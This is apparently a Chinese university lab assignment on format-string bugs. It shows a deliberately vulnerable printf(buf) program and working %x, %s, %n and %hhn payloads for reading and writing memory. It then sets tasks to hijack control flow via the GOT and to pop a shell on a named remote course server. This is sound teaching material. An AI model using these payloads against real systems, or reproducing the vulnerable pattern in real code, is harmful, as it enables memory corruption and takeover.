此次作业将针对格式化字符串漏洞 (format-string-bug, FSB)进行实验

## 知识点

### 字符串漏洞基本利用

如课上所提到的，格式化字符串漏洞是一种强有力的利用原语——攻击者往往可以利用其轻松构筑内存任意读、任意写原语，从而泄露敏感信息绕过保护甚至轻松劫持程序控制流。随着安全编程意识的提倡以及编译器自带的检查，格式化字符串漏洞已经逐步销声匿迹，但学习其的原理和利用，却仍是非常重要的。

如下示例程序

```c
#include <stdio.h>
#include <unistd.h>
int var = 0x1234;
int main()
{
    char buf[64];
    read(0, buf, 64);
    printf(buf);
    return 0;
}
```

这便是一个最朴实无华的FSB——程序直接以用户输入作为`printf`的格式化串部分进行输出，编译该程序，你将获得如下的警告

```
$ gcc -m32 -no-pie main.c -o main
main.c: In function ‘main’:
main.c:8:12: warning: format not a string literal and no format arguments [-Wformat-security]
     printf(buf);
            ^~~
```

格式化字符串漏洞的原理，简单而言，便是在格式化串中恶意布置格式化表示符(如`%x`)，结合栈上布置的恶意payload实现恶意行为。其细节请参考课上的教案进行复习，这里只对基本利用进行回顾 (32位例) 。

**通过格式化串泄露栈上数据**

如上代码，我们可以按照如下方法输入来泄露栈上的数据

```
$ ./main
%x%x%x%x%x%x
ffa0d33c4080484cd000
%����%
```

当然，完全连接的数据不太方便解析，加入一些分隔符便可以拿到更好的效果

```
$ ./main
%x.%x.%x.%x.%x.%x
ffb7cd3c.40.80484cd.0.0.0
��%
```

**通过格式化串泄露任意数据**

任意泄露的原理是通过结合`%s`表示符以及指针完成，下面也进行简单示例，首先可以通过特定的串来找到输入数据与参数栈的偏移

```
$ ./main
AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffd2373c.40.80484cd.0.0.0.41414141.252e7825.78252e78.2e78252e.252e7825
3��%
```
如上，我们发现第7个%x打印出了`41414141`，也就是我们输入的`AAAA`，这样一来便能计算出参数栈与输入之间相差的偏移；我们可以使用`$`标识符来进行专门指定，如下

```
$ ./main
AAAA%7$x
AAAA41414141
```

这里的`%7$x`就是指定打印第7个%x对应的栈上数据。有了这个能力后，我们把`AAAA`先替换成全局变量`var`的地址。地址的查询可以通过`readelf`或者静态分析工具完成，实验环境这里使用的地址为 `0x0804a024`

```
$ echo -e '\x24\xa0\x04\x08%7$x' | ./main
$804a024
```

可以看到，`%7$x`现在输出的恰恰是我们布置的`0x804a024`；现在，只需要将`%7$x`修改为`%7$s`，即`printf`将值`0x804a024`当作一个字符串指针去访问，我们便可以读到该地址处变量，也就是`var`的值了

```
$ echo -e '\x24\xa0\x04\x08%7$s' | ./main | hexdump
0000000 a024 0804 1234 050a ff93 a589 f7de 5808
```
如上，变量`0x1234`的值便以字符串的形式被打印出来。（由于`%s`需要被`\x00`截断，后面同时也输出了一些垃圾数据

**通过格式化串改写任意数据**

如课上所述，可以通过特殊的`%n`表示符来完成对任意地址的修改，其做法则只需要将上面任意写的`%s`修改为`%n`。我们可以首先给程序加入一些打印来观察我们的修改效果

```c
#include <stdio.h>
#include <unistd.h>
int var = 0x1234;
int main()
{
    char buf[64];
    read(0, buf, 64);
    printf(buf);
    printf("var = %d\n", var);
    return 0;
}
```

接着直接如下修改

```
$ echo -e '\x24\xa0\x04\x08%7$n' | ./main
$�
U���U��var = 4
```
可以看到打印的结果，`var`变量被修改成了`4`，而不是原来的`0x1234`了

> 值得一提，这里的`4`含义为该`printf`函数已经打印的字节长度，可以看到对`%7$n`进行处理时，该`printf`已经完成了对前4个字节，也就是'\x24\xa0\x04\x08`的打印

### 通过短字节修改优化效率

假若攻击者需要将`var`修改成`0xdeadbeaf`；根据上文内容，其需要在处理`%n`前完成`0xdeadbeaaf`这样字节长的打印，这样做的效率太低，在设置超时的题目中往往行不通。面对这样的问题，可以通过短字节修改进行优化

- `%hn`: 修改2字节目标
- `%hhn`: 修改1字节目标

我们可以通过如下方式进行测试

```
$ echo -e '\x24\xa0\x04\x08%7$hhn' | ./main
$�
��5����var = 4612
```
这里的结果`4612`便是`0x1204`，即此处的`%hhn`仅修改了最低字节为`04`；这样做虽然麻烦了一些，但可以减少既定数据的长度。　


## 作业

***DDL: 4月28日 23:59***

### 实验内容

#### **01 fmt32**

提供了存在FSB的目标可执行程序，其源代码（伪代码）以及一个动态链接库程序，指定链接库的运行方法如下

```
LD_LIBRARY_PATH=path ./echo
# 请把 path 替换为 libtarget.so 所在文件夹位置的路径
```

目标程序的保护情况如下

![enter image description here](https://images.gitee.com/uploads/images/2021/0413/103157_40e40edf_5739219.png "截屏2021-04-13 上午10.31.46.png")

> PIE未打开，可以写GOT表来完成PC hijacking

目标程序为每位同学提供了一个函数跳板

```c
void target_XXX()
{
    target_function_XXX();
    return;
}
```

如若你的学号为`3180100000`，则计划则是跳入到`target_ 3180100000`中，其会进而跳往`target_function_3180100000`，这样完成控制流的劫持。

除去控制流劫持外，作业还要求对全局变量的值进行修改，位于动态链接库的函数`target_function_XXX()`，会检查同学有无将变量`id`修改为`XXX`等值，如果修改成功，会给出相关`handler`的信息，否则会给出`Try harder`信息。

*如下是成功修改控制流但没有成功修改变量的结果*

![enter image description here](https://images.gitee.com/uploads/images/2021/0413/102947_5dd4809b_5739219.png "截屏2021-04-13 上午10.29.38.png")

*如下是均成功修改的结果*

![enter image description here](https://images.gitee.com/uploads/images/2021/0413/102825_759fcbf4_5739219.png "截屏2021-04-13 上午10.27.14.png")

#### **02 fmt64**

提供了存在FSB的目标可执行程序以及一个动态链接库程序，**题目源代码与上一个`fmt32`无区别**，仅仅是架构以64位程序编译。目标同为劫持控制流+修改全局变量，目标程序仍未打开PIE保护

![enter image description here](https://images.gitee.com/uploads/images/2021/0413/103418_d881abb9_5739219.png "截屏2021-04-13 上午10.34.08.png")

#### **03 bonus**

通过以上的实验，似乎字符串漏洞的套路便是利用格式化表示符 + 可以控制的栈上数据相互合作来进行利用。那么试想一下，如果格式化字符串的数组不在栈上，题目该如何完成呢？

提供了存在FSB的目标可执行程序以及远程环境使用的libc程序，请通过劫持控制流完成弹shell，从而如同往常实验一样运行远程机器上的`flag.exe`

> 值得一提，目标程序打开了PIE保护

成功完成的截图如下

![enter image description here](https://images.gitee.com/uploads/images/2021/0413/105836_058107a9_5739219.png "截屏2021-04-13 上午10.38.08.png")

### 实验要求

**强调：注意实验1，2本地完成需要打开机器的ASLR，保持栈地址的随机化**

**Challenge 1. fmt32 [50 分]**
在实验报告中提供截图和攻击代码证明完成如下目标
- 成功劫持控制流，如改写GOT表，跳到对应学号的`target_function_XXX`中，打印`Try harder`；30分
- 在上基础上成功修改变量，跳到对应学号的成功信息；20分

**Challenge 2. fmt64 [50 分]**
在实验报告中提供截图和攻击代码证明完成如下目标
- 在报告中阐述32位fsb攻击和64位fsb攻击存在的主要区别，能不能直接将32位的攻击方式用到64位上呢？为什么？；10分
- 成功劫持控制流，如改写GOT表，跳到对应学号的`target_function_XXX`中，打印`Try harder`；20分
- 在上基础上成功修改变量，跳到对应学号的成功信息；20分

**Bonus [25 分]**
远程服务器地址
```
ip: 47.99.80.189, port: 10020
```

在实验报告中提供截图和攻击代码证明完成如下目标
- 阐述非栈上fsb漏洞利用方式；5分
- 成功劫持控制流完成弹shell；20分

## 参考资料
- http://phrack.org/issues/67/9.html
- https://ctf-wiki.org/pwn/linux/fmtstr/fmtstr_intro/